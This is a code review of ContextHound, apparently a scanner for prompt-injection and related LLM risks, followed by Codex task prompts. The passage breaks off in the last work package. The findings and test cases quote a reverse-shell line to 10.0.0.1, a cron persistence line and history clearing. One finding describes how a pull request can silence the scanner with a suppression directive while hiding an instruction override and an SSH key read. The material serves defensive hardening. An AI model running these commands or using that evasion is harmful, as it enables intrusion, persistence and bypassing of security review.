# ContextHound project review (v2.2.2)

Review date: 2026-10-30. Scope: the whole repository at `4183c9d` (Release 2.2.2): `src/`, `scripts/`, `tests/`, `benchmarks/`, `action.yml`, workflows, README, CHANGELOG, CONTRIBUTING and SECURITY.

"Planned features" means what README, CHANGELOG, code comments and public types promise. There is no separate roadmap file and no open GitHub issues; the open pull requests are Dependabot updates only.

Section 4 has ready-to-paste prompts for Codex, one per work package. Each one stands alone.

---

## 1. Health snapshot

| Check | Result |
|---|---|
| `npm ci && npm run build` | Passes |
| `npm test` | 27 suites, 951 tests, all passing |
| `npm run lint` | Clean, 0 warnings |
| `npm run benchmark` | 0.0% file-level FP (0/19), 100% detection (15/15) |
| `npm audit --omit=dev` | 0 vulnerabilities |
| `npm audit` (dev) | 7: 1 critical (`handlebars` 4.7.9, fixed in 4.7.10, Dependabot PR #41 open), 6 low (`deepmerge` through `jest-config`, no fix upstream) |
| Rules | 122 in 15 families. All have OWASP IDs; 41 have no MITRE ID |
| Rules with no direct test | EXF-004, JBK-003 (INJ-004 is mentioned once) |
| Benchmark rule coverage | 14 of 122 rules have a labelled fixture |

The codebase is in good shape: strict TypeScript, config validation, output escaping, ReDoS regression tests, and a hardened Action. The problems below are mostly trust-boundary gaps (the scanner trusts content from the repository it scans) and detection coverage gaps that the benchmark is too small to show.

---

## 2. Planned vs implemented

| Promised feature (source) | Status | Notes |
|---|---|---|
| 122 rules, 15 families (README) | Done | Registry and README tables are generated and tested |
| OWASP mapping on every rule (README, 2.2.0) | Done | |
| MITRE ATT&CK tagging (2.0.0) | Partial | 81/122. Missing: all TOOL, RAG (6), OUT (4), VIS, SKL, AGT (6), MCP (3). See F13 |
| 9 output formats (README) | Done | JSON report has no tool version, timestamp or scanned-file count (F5, F28) |
| GitHub Action, SARIF upload, PR comment (README) | Done, with gaps | Leaves a cache file in the workspace (F20); PR comment lookup hard-codes the bot login (F21) |
| `hound fix` for ENC-002 to ENC-005 (README) | Partial | Only works on files the extractor emits; hidden characters in ordinary code or shell files are never seen (F6) |
| Multi-language scanning (README) | Partial | Trigger lists miss current SDKs (Responses API, Vercel AI SDK, Gemini `@google/genai`, official Java/Go SDKs, Bedrock, Ollama, Mistral). Shell scripts only get rules when they `curl` OpenAI or Anthropic (F6, F9) |
| `excludeRules` / `includeRules` (README, CHANGELOG mentions `--include-rules`, `--exclude-rules`) | Partial | Config only. No CLI flags, though CHANGELOG 2.1.0 and `src/cli.ts:300` refer to them (F8) |
| Rule presets (README) | Partial | CLI and Action only; no `presets` config key (F8) |
| Incremental cache (README) | Done | Hardening needed for CI (F20) |
| `.gitignore` / `.houndignore` (README) | Done | |
| Plugin system (README) | Done, unsafe | Plugins named in the scanned repo's config are `require()`d, which contradicts the README's own reason for refusing JS configs (F1). Plugin rules are not validated (F2) |
| Baseline and `--diff` (README) | Done | `resolved` count is wrong when combined (F29) |
| Inline suppressions (README) | Done, unsafe | Anyone who can edit a scanned file can silence every rule in it (F3) |
| Watch mode, concurrency (README) | Done | |
| Prompt files vs documentation (README) | Done, buggy | Classification uses the absolute path, so a checkout under a folder called `prompts`, `skills`, `instructions` or `personas` treats every README as a prompt (F4) |
| INJ-015 taint analysis (2.1.0, "JS/TS") | Done for JS/TS | No Python support; sinks are only backtick templates (F11) |
| Runtime guard with `block`/`warn`/`log`/`allow` actions (`src/runtime/types.ts:29`) | Partial | `warn` and `log` do nothing (F16). No normalisation of obfuscated text (F17). Tool results and Responses API content parts are skipped (F18) |
| Benchmark with per-rule precision/recall (README) | Done, narrow | Covers 14 rules (F26) |
| Release workflow with provenance (2.1.0) | Done | No guard that README and pre-commit version pins match (F22) |
| Node.js >= 20.19 (README) | Done, aging | Node 20 reached end of life in April 2026 (F23) |
| SECURITY.md supported versions | Stale | Says 1.x (F24) |

---

## 3. Findings

Severity: **P0** security or gate-bypass bug, **P1** detection gap or wrong behaviour, **P2** hardening, docs, maintenance.
"Verified" means reproduced against `dist/cli.js` during this review.

### P0: trust boundary and gate integrity

**F1. Plugins from the scanned repository's config run arbitrary code.** Verified.
`src/scanner/pipeline.ts:43-64` calls `require()` on every path in `plugins`, and that list comes from the scanned repo's `.contexthoundrc.json`, `.contexthoundrc` or `package.json`. A pull request can add a plugin plus a config entry and get code execution in CI. The Action explicitly supports `pull_request_target` (where the token can write), and `hound fix` runs plugins too. README line 352 refuses JS configs for exactly this reason. Paths are also resolved against the scan directory rather than the file that declared them, so a plugin listed in an `extends` file resolves wrongly.
Fix: plugins only load when the person running the tool opts in (`--plugin <path>` on the CLI, `--allow-plugins`, or `HOUND_ALLOW_PLUGINS=1`). Plugins named in a config are ignored with a warning otherwise. Resolve paths relative to the config file. Action gets `allow-plugins` (default `false`).

**F2. A plugin with an invalid severity makes the score `NaN`, and the gate passes.** Verified: `severity: 'bogus'` with `threshold: 1` printed `PASSED: score NaN is below the threshold of 1` and exited 0.
`calcRiskPoints` (`src/rules/types.ts`) returns `NaN`, `combineRisk` propagates it, and `NaN >= threshold` is false.
Fix: validate plugin rules on load (id pattern, unique id, no collision with built-ins, severity and confidence enums, `check` is a function, optional `docs`/`owasp` types) and skip invalid ones with a clear warning. Make `combineRisk` and `buildScanResult` fail closed on non-finite numbers.

**F3. Inline suppressions are controlled by whoever edits the scanned file.** Verified: a `skills/x/SKILL.md` containing `hound-disable-file` plus an instruction override, a remote skill fetch and an SSH key read produced 0 findings, "Suppressed: 6", exit 0.
Directives are honoured in any file type, with no reason required, and suppressed findings disappear from SARIF, JSON and the PR comment (only a count survives). This is the obvious evasion for the untrusted pull request case ContextHound targets.
Fix:
- Config `inlineSuppressions`: `"on"` (default, current behaviour), `"require-reason"`, `"off"`, plus `--no-inline-suppressions`.
- Config `allowFileSuppressions` (default `true`) to reject `hound-disable-file` and bare `hound-disable` with no rule IDs.
- Emit suppressed findings in SARIF as results with `suppressions: [{ kind: "inSource", justification }]`, and in JSON as `suppressedFindings`, so GitHub and auditors still see them.
- PR comment lists the suppressions found in changed files.
- Action input `inline-suppressions` passed through.

**F4. Prompt-vs-doc classification uses the absolute path.** Verified: the same README gave 3 findings (score 70, FAILED) under `/…/prompts/repo/` and 0 under `/…/plain/repo/`.
`extractPrompts(file, content)` gets the absolute path from `pipeline.ts`, and `isPromptTextFile` (`src/scanner/extractor.ts:180`) plus the `isSkillMd` check (`:219`) look at every directory segment, including those above the repository. GitHub Actions checks out to `/home/runner/work/<repo>/<repo>`, so a repository named `prompts` or `skills` is misclassified everywhere.
Fix: classify on the repository-relative (or scan-relative) path; pass it into `extractPrompts` as a separate argument and keep the absolute path for reading.

**F5. Scanning zero files passes silently.** Verified: an empty directory prints "No findings. All clear." and exits 0.
A typo in `include`, a wrong `--dir`, or `--diff` against a ref with no changes all look like a clean pass. `ScanResult` has no file count.
Fix: add `stats: { discovered, scanned, cached, skipped, unreadable, durationMs }` to `ScanResult`, JSON and SARIF (`run.properties`), print "Scanned N files" in the console summary, warn on stderr when 0 files were scanned, and add `failOnNoFiles` / `--fail-on-no-files` (default `false`, exit code 2).

**F6. Many rules never run on shell scripts or ordinary code.** Verified: `install.sh` with a cron persistence line, a `/dev/tcp` reverse shell and `history -c` gave 0 findings; `plain.ts` with a bidi override and four zero-width spaces gave 0 findings.
`extractFromCode` (`src/scanner/extractor.ts`) only emits a whole-file `code-block` when a trigger pattern matches; for `.sh`/`.bash` the trigger (`src/scanner/languages.ts`) is `curl … api.openai.com`. So PST-001 to PST-008, CMD-006 to CMD-008 and SCH-005/006 effectively only fire on LLM-calling scripts, and ENC-002 to ENC-005 (and `hound fix`) never see code files without a prompt-like literal. Trojan Source characters are suspicious in any file.
Fix: always emit a `code-block` for `.sh`, `.bash`, `.zsh`, `Dockerfile`, `Makefile` and other script types; run the hidden-character rules (ENC-002 to ENC-005) against the full content of every scanned file regardless of extraction (and dedupe against existing findings). Keep the benchmark at 0% FP.

**F7. `--out results.json` writes `results.json.json`.** Verified.
`src/cli.ts:368` builds the JSON path without the `withExt` helper every other format uses.
Fix: use `withExt('.json', 'hound-results.json')`, add a CLI test.

**F8. Documented rule-filter flags are missing.**
CHANGELOG 2.1.0 names `--include-rules` and `--exclude-rules`, and `src/cli.ts:300` says "patterns already set via config or --include-rules", but neither flag exists. Presets cannot be set in the config file.
Fix: add `--include-rules <ids>` and `--exclude-rules <ids>` (comma separated, prefix globs, validated against known IDs with a "did you mean"), a `presets` config key (array of preset names, validated, merged the same way as `--preset`), the JSON Schema update (`npm run schema`), and README rows.

### P1: detection and behaviour gaps

**F9. Current LLM SDKs are not recognised.** Verified with the OpenAI Responses API and the Vercel AI SDK: `eval(r.output_text)` (OUT-003), an uncapped `responses.create({ model: "o3", … "Think step by step in full detail" })` (DOS-001) and `document.body.innerHTML = text` (OUT-002) were all missed.
Places to update: `COMPLETIONS_PATTERN` (`src/scanner/extractor.ts:157`), `LLM_TRIGGERS` (`src/scanner/languages.ts`), `LLM_CONTEXT` (`src/rules/types.ts`), DOS-001 `callPattern` (`src/rules/dos.ts:21`), OUT-003 `LLM_OUTPUT_ARG` (`src/rules/outputHandling.ts:13`), OUT-002 sinks (`innerHTML`, `outerHTML`, `insertAdjacentHTML`, `v-html`, `document.write`).
Add: `responses.create`, `output_text`, `generateText`/`streamText`/`generateObject`, `generateContent` (`@google/genai`, `google.genai`), LangChain `.invoke(`, Python `mistralai`, `cohere`, `ollama`, `boto3` `bedrock-runtime` `converse`, `vertexai`, `groq`; Go `github.com/openai/openai-go`, `github.com/anthropics/anthropic-sdk-go`; Java `com.openai`, `com.anthropic`. DOS-001 caps should include `max_output_tokens` for Responses (already) and `maxOutputTokens`; reasoning models should include `gpt-5` reasoning variants and `reasoning: {`.

**F10. Hard-coded extension lists drop `.mjs`, `.cjs`, `.mts`, `.cts`.** Verified: `Handlebars.compile(userTemplate)` in `tpl.mjs` is not flagged.
`src/rules/injection.ts:592` (INJ-016). Centralise language detection (`isJsLike(ext)`, `isPython(ext)`) in one module and use it in rules and the extractor. Also make the `.json`/`.yaml` checks in `extractPrompts` case-insensitive, and either add `.c`/`.cpp`/`.h` to the default include list or remove them from `isCodeFile` and `languages.ts` (they are recognised but never scanned by default).

**F11. Injection coverage is template-literal centric.**
INJ-001 misses `"…" + userInput`, Python `.format()` and `%`, and Java/Kotlin concatenation; INJ-008 only matches JS template literals; INJ-015 taint is JS/TS-only and only treats backtick templates as sinks.
Fix: add concatenation and `.format`/`%` patterns behind the same delimiter/sanitiser checks; extend taint to Python (Flask/FastAPI/Django `request.*`, `sys.argv`, `input()` sources; f-strings, `.format`, concatenation and `messages.append({...})` sinks).

**F12. Category taxonomy is too coarse.** 42 rules, including CMD reverse shells, ENC, OUT and RAG, are `category: 'injection'`, which is what `hound explain`, SARIF tags and the HTML report show.
Fix: widen the `Rule['category']` union with `command-injection`, `rag`, `encoding`, `output-handling`, update the rules, `CATEGORY_BLURB` in `src/cli.ts`, reports and tests. Note it in CHANGELOG (SARIF tags change; fingerprints do not).

**F13. MITRE coverage and ATLAS.** 41 rules have no `mitre`. For LLM-specific risks MITRE ATLAS is the better fit (for example `AML.T0051` LLM Prompt Injection, `AML.T0054` LLM Jailbreak, `AML.T0056` LLM Meta Prompt Extraction, `AML.T0057` LLM Data Leakage, `AML.T0010` ML Supply Chain Compromise).
Fix: add an optional `atlas?: string[]` field to `Rule` and `Finding`, map every rule (`src/rules/atlas.ts`, like `owasp.ts`), show it in explain, verbose console, SARIF tags (`atlas:AML.T0051`), JSON, CSV (new trailing column), Markdown and HTML; fill obvious missing ATT&CK IDs; add a test that every rule has ATLAS or ATT&CK.

**F14. Mitigation detection is too broad on whole-file prompts.** `scoreMitigations` (`src/rules/mitigation.ts`) runs on the `code-block` prompt too, so any triple-backtick or any `escape(` call anywhere in a source file cuts every INJ finding in that file by 20% or 15%.
Fix: for `code-block` prompts only count mitigations within a window around the finding (or skip mitigation scoring for `code-block` and rely on per-rule sanitiser checks). Add tests.

**F15. Low-precision patterns to tighten (not yet visible in the benchmark).** INJ-005: the context check `/(?:system|prompt|…)/i.test(prompt.text)` is always true on a whole file (`src/rules/injection.ts:206`). INJ-011: any `document.querySelector(` in an LLM file is flagged even when unrelated to the prompt. Add safe fixtures that would catch these, then narrow the rules (same-statement or data-flow proximity).

**F16. Runtime guard `warn` and `log` actions do nothing.** `GuardAction` (`src/runtime/types.ts:29`) offers `block | warn | log | allow`, but `evaluateBlocked` only looks for `block`; nothing warns or logs.
Fix: add `onWarn(result, findings, messages)` and `logger` (default `console`) to `GuardConfig`; `warn` calls `onWarn` (or `logger.warn`) once per inspection with the matching findings, `log` calls `logger.info`/`debug`; add `actions: Record<findingId, GuardAction>` to `InspectResult`. Document in README.

**F17. Runtime guard skips the normalisation the static scanner applies.** `runInspect` (`src/runtime/inspect.ts`) builds prompts without calling `normalise()`, so URL-encoded, octal-escaped, Base32 or homoglyph-obfuscated payloads that the CLI catches pass the guard.
Fix: export `normalise` from the extractor and apply it to the `raw` prompt; keep `code-block` as is.

**F18. Runtime guard ignores tool results and newer content shapes.** `extractText` (`src/runtime/inspect.ts:21`) only reads `type: 'text'` parts; `RuntimeMessage.role` lacks `developer`. Anthropic `tool_result` blocks (nested `content`), OpenAI Responses `input_text`/`output_text` parts and `function_call_output` are skipped, and that is where indirect injection arrives.
Fix: recurse into nested `content`, accept `input_text`, `output_text`, `tool_result`, `function_call_output`; add the `developer` role; add `policy.roles` to limit which roles are inspected; add `inspectOutput(text)` and an option on `wrap` to scan the model's response for secrets (EXF-008) and system-prompt leakage before returning it. Fix the stale "built-in 86" comment (`src/runtime/types.ts:72`).

### P2: hardening, CI, docs, maintenance

**F19. Cache trust and placement.** The cache lives in the scan directory (`src/scanner/cache.ts`). The Action does not pass `--no-cache` (`action.yml:139`), so it leaves `.hound-cache.json` in the caller's workspace, and a cache committed to the scanned repository is loaded if its signature matches (the signature is computable from public data; only the mtime check stops reuse).
Fix: add `cachePath` config / `--cache-path`, never load a cache file that git tracks, and have the Action pass `--no-cache` (or a path under `$RUNNER_TEMP`). Also stat before reading content when writing a cache entry so a file changed mid-scan cannot be cached with stale findings.

**F20. PR comment identity is hard-coded.** `scripts/action-pr-comment.js:18` only edits comments from `github-actions[bot]`. With a GitHub App token or PAT it posts a new comment on every run.
Fix: resolve the token's own login (`GET /user`; for app installation tokens fall back to the marker plus `performed_via_github_app`), and accept an optional `comment-author` input. Also make truncation close any open `<details>` block and never cut inside a code span.

**F21. Release consistency.** `tests/action.test.ts` checks the Action's default version, but README (`npm install -g context-hound@2.2.2`, pre-commit `rev: v2.2.2`, "Results on 2.2.2") and `.pre-commit-hooks.yaml` are not checked, and the release workflow does not verify a CHANGELOG section exists for the tag.
Fix: extend `tests/docs.test.ts` to check all pins against `package.json`; add a release step that fails when `## [x.y.z]` is missing from CHANGELOG.

**F22. Node and dependency plan.** Node 20 is end of life (April 2026) but is still the floor and in the CI matrix. `commander` 15 needs Node 22.12 (already ignored by Dependabot); `chokidar` 6 needs Node 22.22 and is not ignored, so Dependabot will propose a breaking update. Open PRs: #41 (handlebars 4.7.10, dev-only critical, merge), #38 (TypeScript 7, needs a compatibility check with ts-jest and `declarationMap`), #37, #39, #42.
Fix now: add a Dependabot ignore for `chokidar` majors; bump the `handlebars` override to `^4.7.10`. Plan v3.0.0: `engines.node >=22.22`, CI matrix 22/24, then commander 15 and chokidar 6.

**F23. SARIF and JSON metadata.** SARIF: `%SRCROOT%` is used without `originalUriBaseIds`; `executionSuccessful` is always `true` even when a rule threw (`src/report/sarif.ts:207`); rule `helpUri` points to MITRE, or nowhere, instead of rule docs; no `automationDetails`. JSON: no tool version, timestamp or stats.
Fix: add `originalUriBaseIds`, record rule errors as `toolExecutionNotifications` with level `error` and set `executionSuccessful` accordingly, set `helpUri` to the README anchor for the rule family, add `automationDetails.id`; add `tool: { name, version }`, `generatedAt` and `stats` to JSON.

**F24. SECURITY.md is stale.** Supported versions table says 1.x; the threat model does not mention plugins, suppressions or untrusted pull requests. Update after F1 and F3.

**F25. CONTRIBUTING.md is stale.** The rule-file table lists 5 of 15 families; the steps miss `src/rules/owasp.ts`, the benchmark fixture and `npm run docs`, which README's own Contributing section lists.

**F26. The benchmark covers 14 of 122 rules.** README presents per-rule precision/recall, but 108 rules have no labelled fixture.
Fix: add at least one unsafe fixture per rule (several rules can share a file), more safe fixtures in the families with known FP risk (INJ-005, INJ-011, OUT-001, AGT-002, MCP), and a test that every rule ID appears in `benchmarks/labels.json` or in an explicit waiver list.

**F27. Untested rules.** EXF-004 and JBK-003 have no direct test; INJ-004 has one. Add positive and negative cases.

**F28. `--baseline` with `--diff` over-reports "resolved".** `src/scanner/baseline.ts:73` counts every baseline finding in files that were not rescanned as resolved. Only count files that were in the scanned set.

**F29. Smaller CLI issues.**
- `--list-rules --format json` omits `owasp`, `mitre`, `docs` and `autofix` (explain JSON has them).
- `hound init` ignores `--dir` and omits `gitignore` from the template.
- Unreadable files are dropped silently (`src/scanner/pipeline.ts:130`); report them in `skippedFiles` with reason `unreadable`.
- `maxFindings` keeps a nondeterministic set of files under concurrency; document it or make it deterministic (scan sorted, cut after sorting).
- Rule filters are re-evaluated for every prompt and rule; compute the active ruleset once per scan.

**F30. Invisible characters survive in console and PR comment output.** `TERMINAL_UNSAFE` (`src/report/sanitize.ts:11`) does not cover Unicode tag characters (U+E0000 to U+E007F) or variation selectors, so ENC-003/ENC-005 evidence is invisible in the terminal and the PR comment. Escape them to `<U+XXXXX>` in `toTerminalSafe` and `markdownCode`.

**F31. Rule ID gap.** SCH-002 does not exist. Note it as retired in README or the registry so nobody reuses it.

---

## 4. Codex prompts

Shared rules for every prompt below (paste them with each one):

```text
Repository: ContextHound (TypeScript, Node >= 20.19, CommonJS, Jest via ts-jest).
Before finishing, run and make pass: npm run build, npm test, npm run lint, npm run benchmark.
If you change rules or rule metadata, run npm run docs. If you change the config spec, run npm run schema.
Add tests for every behaviour change (positive and negative). Keep the benchmark at 0% FP and 100% detection.
Add an entry under "## [Unreleased]" in CHANGELOG.md. House style: plain punctuation, colons and commas, no em or en dashes.
Match the surrounding code style and comment density. Do not change finding fingerprints unless the task says so.
Do not loosen any existing security escaping in src/report/.
```

### WP1: plugin trust and validation (F1, F2)

```text
Goal: stop the scanned repository from executing code through plugins, and make invalid plugin rules impossible to slip past the gates.

Context:
- src/scanner/pipeline.ts loadPluginRules() calls require() on every entry of config.plugins. That list can come from the scanned repo's .contexthoundrc.json, .contexthoundrc or package.json "contexthound" section (src/config/loader.ts), so a pull request can run code in CI. README already refuses JS configs for this reason.
- A plugin rule with severity "bogus" makes calcRiskPoints() (src/rules/types.ts) return NaN; combineRisk() (src/scoring/index.ts) propagates it and buildScanResult() passes because NaN >= threshold is false.

Implement:
1. Plugin opt-in. Plugins load only when one of these is true: the CLI flag --allow-plugins is given, HOUND_ALLOW_PLUGINS is 1/true/yes, or the plugin was passed directly with a new repeatable --plugin <path> flag. Library callers of runScan() opt in with a new AuditConfig field allowPlugins?: boolean (default false). When plugins are configured but not allowed, skip them and print one warning to stderr naming them and how to enable them.
2. Resolve config-declared plugin paths relative to the directory of the config file that declared them (track the source dir through extends in loader.ts), and CLI --plugin paths relative to process.cwd().
3. Validate every loaded rule: id matches /^[A-Z][A-Z0-9]*-\d+$/, not equal to a built-in id, unique among plugins, title and remediation non-empty strings, severity in low|medium|high|critical, confidence in low|medium|high, check is a function, docs boolean if present, owasp string[] if present. Invalid rules are skipped with a warning that says why.
4. Fail closed on bad numbers: combineRisk() ignores non-finite inputs and buildScanResult() adds a failure of kind 'threshold' if repoScore is not finite.
5. hound fix must follow the same opt-in.
6. action.yml: new input allow-plugins (default 'false', validated true|false) that adds --allow-plugins.
7. Update README (Custom rule plugins, Configuration table, Action inputs, env vars) and SECURITY.md threat model. This is a behaviour change for existing plugin users: call it out under "Changed" in CHANGELOG.

Tests: plugin ignored without opt-in (and the plugin file's side effect does not happen), loaded with each opt-in route, path resolution from an extended config, each validation failure, NaN cannot pass a gate.
```

### WP2: suppression governance (F3)

```text
Goal: let teams stop untrusted content from silencing findings, and keep suppressed findings visible in reports.

Context: src/scanner/suppressions.ts honours hound-disable-line, -next-line, -file and block directives in any file. A pull request can add "hound-disable-file" to a SKILL.md and every finding disappears; only a count reaches the reports. pipeline.ts applies them; SARIF is built in src/report/sarif.ts.

Implement:
1. Config inlineSuppressions: "on" | "require-reason" | "off" (default "on"), CLI --inline-suppressions <mode> and --no-inline-suppressions. "require-reason" ignores directives without a "-- reason". Add to CONFIG_FIELDS in src/config/schema.ts and regenerate the schema.
2. Config allowFileSuppressions (boolean, default true). When false, hound-disable-file and any directive with no rule IDs are ignored.
3. Ignored directives are reported in a new ScanResult.ignoredSuppressions list (file, line, reason why ignored) and on stderr.
4. Keep suppressed findings: ScanResult.suppressedFindings (Finding plus suppression { kind: 'inSource', justification?, directiveLine }). SARIF emits them as results with "suppressions": [{ "kind": "inSource", "justification": ... }]. They never count toward scores or gates. JSON includes them. Console shows them only with --verbose. HTML and Markdown show a collapsed "Suppressed" section.
5. buildPrComment (src/report/prComment.ts) lists suppressed findings in a separate collapsed section, rendered with the existing code-span escaping.
6. action.yml: input inline-suppressions (on|require-reason|off, default on).
7. README: document the modes and recommend "require-reason" plus allowFileSuppressions: false for repositories that accept outside contributions.

Tests: each mode, file-level rejection, SARIF suppressions shape, scores unchanged by suppressed findings, PR comment escaping of justification text.
```

### WP3: path classification, empty scans, output path (F4, F5, F7)

```text
Goal: fix three scanner correctness bugs.

1. Classification uses absolute paths. extractPrompts(filePath, content) in src/scanner/extractor.ts receives the absolute path from src/scanner/pipeline.ts. isPromptTextFile() and the isSkillMd check look at every directory segment, so any checkout under a folder named prompts, prompt, instructions, personas, skills, .openclaw or clawhub (for example a repo named "prompts" on GitHub Actions: /home/runner/work/prompts/prompts) turns every README into a prompt file. Change extractPrompts to take an options object { relativePath } and classify on the scan-relative POSIX path; keep reading from the absolute path. Update pipeline.ts, fix.ts, the runtime and the library export. Keep the existing single-argument call working for library users by falling back to the basename-only check.
   Test: scan a temp dir created under a parent folder named "prompts" and assert the README is treated as documentation.

2. Zero files scanned passes silently. Add ScanResult.stats = { discovered, scanned, fromCache, skipped, unreadable, durationMs }. Fill it in runScan(). Print "Scanned N file(s)" in the console summary, include stats in JSON and in SARIF run.properties. Print a stderr warning when scanned is 0. Add config failOnNoFiles (boolean, default false) and --fail-on-no-files: when true and scanned is 0, add a failure (new kind 'no-files', exit code 2). Unreadable files go into skippedFiles with reason 'unreadable' (extend the SkippedFile type).

3. src/cli.ts reportPaths(): the json entry ignores the withExt helper, so --out results.json writes results.json.json. Use withExt('.json', 'hound-results.json').

Update README (exit codes, config table, JSON report fields) and tests in tests/cli.test.ts and tests/scanner.test.ts.
```

### WP4: CLI flags and presets in config (F8, F29)

```text
Goal: add the rule filter flags the changelog already promises and tidy small CLI gaps.

1. src/cli.ts scan: add --include-rules <ids> and --exclude-rules <ids> (comma separated; exact IDs or prefix globs ending in *). Validate each pattern against allRules plus loaded plugin rules; unknown IDs are a ConfigError with a "did you mean" suggestion (reuse the levenshtein helper from src/config/schema.ts, export it). CLI values replace the config values. Include them in the cache signature (already covered by includeRules/excludeRules).
2. Config key presets: string[] of preset names, validated against PRESETS in src/config/presets.ts, merged into includeRules the same way --preset is. --preset adds to config presets. Regenerate the schema.
3. --list-rules --format json: include owasp, mitre, docs, autofix (match the explain JSON fields).
4. hound init: accept --dir <path> and write there; include "gitignore": true in the template.
5. pipeline.ts: compute the active ruleset (filters, minConfidence, plugins) once per scan and pass it to analyzePrompt instead of re-checking filters per prompt and rule. Keep analyzePrompt's public signature backward compatible.
6. maxFindings: make the kept set deterministic: process files in sorted order and, after Promise.all, keep findings from files in sorted order until the limit.

Update README tables and tests.
```

### WP5: rules always reach scripts and hidden characters everywhere (F6, F10, F31)

```text
Goal: rules that apply to any script or file must run even when the file does not call an LLM.

Context: extractFromCode() in src/scanner/extractor.ts only emits a whole-file 'code-block' prompt when a trigger regex matches. For .sh and .bash the trigger in src/scanner/languages.ts is a curl to OpenAI or Anthropic. As a result a plain install.sh with "(crontab -l; echo ...) | crontab -", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" and "history -c" yields no findings (PST-001, CMD-006, PST-005 should fire), and a .ts file with a U+202E bidi override or a run of U+200B characters yields nothing (ENC-002, ENC-004), so hound fix cannot fix it either.

Implement:
1. Always emit a 'code-block' for shell and script files: .sh, .bash, .zsh, .ps1, Dockerfile (basename), Makefile. Add the new extensions and basenames to DEFAULT_INCLUDE_GLOBS in src/config/defaults.ts and to isCodeFile().
2. Hidden characters in any file: in extractPrompts(), when the content contains INVISIBLE_CHARS and no extracted prompt already covers the whole file, add a whole-file prompt that only the hidden-character rules run on. Add a new ExtractedPrompt context value 'hidden-chars' and make analyzePrompt run only ENC-002 to ENC-005 on it. Keep the existing dedupe key so nothing is reported twice.
3. Centralise language helpers in a new src/scanner/lang.ts: isJsLike(ext) covering .ts .tsx .mts .cts .js .jsx .mjs .cjs .vue, isPython(ext), isShell(ext). Replace hard-coded lists, starting with INJ-016 in src/rules/injection.ts (line ~592). Make the .json/.yaml/.yml checks in extractPrompts case-insensitive.
4. Decide C/C++: either add **/*.c, **/*.cpp, **/*.cc, **/*.h to the default include, or remove them from isCodeFile() and LLM_TRIGGERS. Prefer removing unless tests show value.
5. Add a comment in src/rules/supplyChain.ts that SCH-002 is retired and must not be reused.

Tests: the install.sh and plain.ts cases above, .mjs Handlebars.compile(userTemplate) flagged by INJ-016, hound fix removes characters from a plain .ts file. Add benchmark fixtures benchmarks/unsafe/pst-001.sh and benchmarks/unsafe/enc-002.ts with labels, and at least two benign shell scripts to benchmarks/safe/ (nohup-free deploy script, a script that writes to /tmp). Keep FP at 0%.
```

### WP6: modern SDK coverage (F9, F11)

```text
Goal: recognise current LLM SDKs and broaden injection sinks.

Places to update:
- COMPLETIONS_PATTERN in src/scanner/extractor.ts
- LLM_TRIGGERS in src/scanner/languages.ts
- LLM_CONTEXT in src/rules/types.ts
- DOS-001 callPattern, limitPattern and reasoningModel in src/rules/dos.ts
- OUT-003 LLM_OUTPUT_ARG in src/rules/outputHandling.ts and OUT-002 sinks

Add recognition for:
- OpenAI Responses API: client.responses.create({ ... }), output_text, response.output[...]
- Vercel AI SDK: generateText, streamText, generateObject, streamObject (import from "ai")
- Google: @google/genai (ai.models.generateContent), google.genai / google.generativeai generate_content
- LangChain: .invoke( / .ainvoke( on chat models, ChatPromptTemplate
- Python: mistralai, cohere, ollama, groq, vertexai, boto3 client("bedrock-runtime") converse/invoke_model
- Go: github.com/openai/openai-go, github.com/anthropics/anthropic-sdk-go
- Java/Kotlin: com.openai, com.anthropic official SDKs
- DOS-001: reasoning signals "reasoning": { / reasoning_effort / gpt-5 reasoning models; caps maxOutputTokens, max_output_tokens
- OUT-003: output_text, .text from generateText results (only when the file has LLM_CONTEXT)
- OUT-002: innerHTML, outerHTML, insertAdjacentHTML, document.write, v-html, Svelte {@html} fed with model output names
- INJ-001: string concatenation ("..." + userInput, '...' + user_input), Python "...".format(user_input) and "..." % user_input, behind the existing delimiter and sanitiser checks
- INJ-015 taint: add Python (sources: Flask/FastAPI/Django request.args/form/json/GET/POST/query_params, sys.argv, input(); sinks: f-strings, .format, concatenation, messages.append({...}) with role/content)

Verified misses to turn into tests:
  const r = await client.responses.create({ model: "o3", input: "Think step by step in full detail: " + userInput });
  eval(r.output_text);                       // OUT-003
  // and the uncapped call above              // DOS-001
  const { text } = await generateText({ model: openai("gpt-4o"), prompt: "Summarise" });
  document.body.innerHTML = text;            // OUT-002

For every new pattern add a negative test (ordinary code that must not fire). Add benchmark fixtures for at least the Responses API and Vercel AI SDK cases and one benign file per SDK in benchmarks/safe/. Keep FP at 0%.
```

### WP7: precision and taxonomy (F12, F13, F14, F15)

```text
Goal: better categories and threat mappings, and less score dampening from unrelated text.

1. Categories. Widen Rule['category'] in src/rules/types.ts with 'command-injection', 'rag', 'encoding', 'output-handling'. Move CMD-* to command-injection, RAG-* to rag, ENC-* to encoding, OUT-* to output-handling. Update CATEGORY_BLURB in src/cli.ts, reports that print the category, tests and docs. Fingerprints must not change. CHANGELOG: SARIF tags change.
2. MITRE ATLAS. Add atlas?: string[] to Rule and Finding, a new src/rules/atlas.ts mapping every rule (for example AML.T0051 prompt injection, AML.T0054 jailbreak, AML.T0056 meta prompt extraction, AML.T0057 data leakage, AML.T0010 supply chain compromise, AML.T0053 plugin compromise), applied in src/rules/index.ts like OWASP. Show it in hound explain (console and JSON), --verbose, SARIF tags (atlas:<id>) and help, JSON/JSONL, a new trailing CSV column atlas, Markdown and HTML chips. Fill missing ATT&CK IDs where a clear technique exists. Add a test that every rule has an ATLAS or ATT&CK ID, and include it in the generated README tables (scripts/readme-rules.js).
3. Mitigations. scoreMitigations() in src/rules/mitigation.ts currently runs on whole-file 'code-block' prompts, so any ``` or escape( anywhere in a file reduces every INJ finding there. For code-block prompts, only count a mitigation if it occurs within 10 lines of the finding (pass the finding line into the reduction), or skip mitigation scoring for code-block. Choose the window approach and test both sides.
4. Precision. INJ-005 (src/rules/injection.ts ~line 206): drop the whole-text context test for code-block prompts and require prompt context on the same statement or within 3 lines. INJ-011: require the DOM value to reach a prompt or LLM call argument within the same function or via a simple variable flow (reuse the taint helpers in src/rules/taint.ts). Add benign fixtures to benchmarks/safe/ that the old patterns would flag.
```

### WP8: runtime guard (F16, F17, F18)

```text
Goal: make the runtime guard do what its types promise.

Context: src/runtime/types.ts defines GuardAction 'block' | 'warn' | 'log' | 'allow', but src/runtime/inspect.ts evaluateBlocked() only handles 'block'. runInspect() does not apply the extractor's normalise(), and extractText() only reads type 'text' parts.

Implement:
